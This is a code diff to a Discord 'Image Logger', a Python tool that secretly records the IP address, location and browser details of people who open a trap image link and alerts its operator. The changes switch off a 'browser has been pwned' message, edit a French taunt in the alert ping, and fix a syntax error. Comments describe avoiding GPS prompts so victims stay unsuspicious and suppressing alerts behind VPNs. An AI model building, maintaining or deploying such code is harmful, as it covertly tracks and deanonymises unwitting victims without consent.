@@ -27,14 +27,14 @@ config = {
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": True, # Enable the custom message?
+        "doMessage": False, # Enable the custom message?
         "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info) 
+        "richMessage": True, # Enable rich text? (See README for more info)
     },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
                 # 0 = No Anti-VPN
-                # 1 = Don't ping when a VPN is suspected 
+                # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
 
     "linkAlerts": False, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
@@ -107,7 +107,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
         return
 
-    ping = "@everyone une nouvelle personne a cliquer sur ton lien bonne chance a lui . . . "
+    ping = "@__inconnu_01 une nouvelle personne a cliquer sur ton lien bonne chance a lui ..."
 
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
     if info["proxy"]:
@@ -144,7 +144,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Image Logger - IP Logged,
+            "title": "Image Logger - IP Logged",
             "color": config["color"],
             "description": f"""**A User Opened the Original Image!**
 
